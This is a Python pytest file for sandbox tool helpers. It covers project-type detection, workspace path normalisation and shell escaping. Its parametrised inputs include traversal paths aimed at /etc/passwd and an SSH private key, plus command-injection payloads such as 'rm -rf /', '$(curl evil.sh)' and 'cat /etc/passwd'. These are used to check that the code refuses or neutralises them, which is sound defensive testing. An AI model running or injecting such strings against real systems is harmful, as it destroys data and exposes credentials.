"""
Sandbox tool helpers.

Project detection and path handling are pure functions extracted from the tool
bodies precisely so they can be tested without a live E2B sandbox.
"""

from __future__ import annotations

import pytest

from app.tools.e2b_tools import _safe_relpath, detect_project_type


class TestProjectDetection:
    @pytest.mark.parametrize(
        ("listing", "expected"),
        [
            ("requirements.txt\nsrc\nREADME.md", "python"),
            ("pyproject.toml\napp", "python"),
            ("package.json\nsrc\nnode_modules", "node"),
            ("go.mod\nmain.go", "go"),
            ("Cargo.toml\nsrc", "rust"),
            ("pom.xml\nsrc", "maven"),
            ("build.gradle\nsrc", "gradle"),
            ("README.md\nnotes.txt", "unknown"),
        ],
    )
    def test_manifests_are_classified(self, listing, expected):
        assert detect_project_type(listing) == expected

    def test_a_manifest_named_inside_another_entry_does_not_match(self):
        # Substring matching against a lowercased blob classified this as Node.
        assert detect_project_type("package.json.backup\nnotes.md") == "unknown"

    def test_maven_wins_over_a_stray_python_file(self):
        assert detect_project_type("pom.xml\nsetup.py") == "maven"

    def test_empty_listing_is_unknown(self):
        assert detect_project_type("") == "unknown"


class TestSafeRelpath:
    @pytest.mark.parametrize(
        ("given", "expected"),
        [
            ("src/auth.py", "src/auth.py"),
            ("/src/auth.py", "src/auth.py"),
            ("workspace/src/auth.py", "src/auth.py"),
            ("./src/auth.py", "src/auth.py"),
            ("src//auth.py", "src/auth.py"),
            ("src\\auth.py", "src/auth.py"),
        ],
    )
    def test_paths_are_normalised_into_the_workspace(self, given, expected):
        assert _safe_relpath(given) == expected

    @pytest.mark.parametrize(
        "given",
        [
            "../etc/passwd",
            "src/../../etc/passwd",
            "/../root/.ssh/id_rsa",
            "..",
        ],
    )
    def test_traversal_is_refused(self, given):
        with pytest.raises(ValueError, match="escapes the workspace"):
            _safe_relpath(given)

    @pytest.mark.parametrize("given", ["", "   ", "/"])
    def test_empty_paths_are_refused(self, given):
        with pytest.raises(ValueError):
            _safe_relpath(given)


class TestShellSafety:
    """
    Commit messages and search patterns are model-generated and reach a shell.

    These assert the escaping contract the tools rely on rather than executing
    anything: a message of `x'; rm -rf /; #` previously ran.
    """

    @pytest.mark.parametrize(
        "payload",
        [
            "x'; rm -rf /; #",
            "$(curl evil.sh)",
            "`whoami`",
            'msg" && cat /etc/passwd',
            "a\nb",
        ],
    )
    def test_shlex_quote_neutralises_metacharacters(self, payload):
        import shlex
        import subprocess

        quoted = shlex.quote(payload)
        # The shell must see exactly one argument with the original bytes.
        result = subprocess.run(
            ["sh", "-c", f"printf %s {quoted}"], capture_output=True, text=True, check=True
        )
        assert result.stdout == payload
